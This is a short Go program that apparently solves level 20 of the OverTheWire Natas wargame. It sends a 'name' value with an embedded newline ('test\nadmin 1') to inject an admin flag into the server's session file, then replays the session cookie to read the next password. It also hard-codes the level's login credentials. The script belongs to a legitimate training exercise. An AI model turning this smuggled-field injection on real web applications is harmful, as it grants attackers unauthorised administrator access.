package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

var (
	username = "natas20"
	password = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"
	url_     = "http://natas20.natas.labs.overthewire.org/index.php"
)

func main() {
	client := http.Client{}
	req, _ := http.NewRequest("GET", url_, nil)
	req.SetBasicAuth(username, password)
	q := req.URL.Query()
	q.Add("name", "test\nadmin 1")
	q.Add("debug", "true")
	req.URL.RawQuery = q.Encode()

	fmt.Println(req.URL.String())

	resp, _ := client.Do(req)

	cookies := resp.Cookies()[0]
	req.AddCookie(cookies)
	resp_, _ := client.Do(req)
	body, _ := ioutil.ReadAll(resp_.Body)

	fmt.Println(string(body))

}
